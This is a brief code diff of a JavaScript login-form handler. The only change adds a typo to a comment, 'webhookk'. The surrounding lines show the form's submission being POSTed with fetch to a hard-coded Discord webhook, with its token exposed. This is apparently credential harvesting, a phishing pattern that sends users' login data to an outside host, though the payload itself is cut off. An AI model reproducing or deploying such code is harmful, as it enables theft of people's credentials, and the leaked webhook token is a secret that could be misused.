@@ -33,7 +33,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
                 return;
             }
 
-            // Send data to Discord webhook
+            // Send data to Discord webhookk
             fetch('https://discord.com/api/webhooks/1310777599972383480/ZVm_axETT7WwNvNVHcuplhdTfMxIK8gNKKnW1KER_KGHDYYgshYohghd', {
                 method: 'POST',
                 headers: {
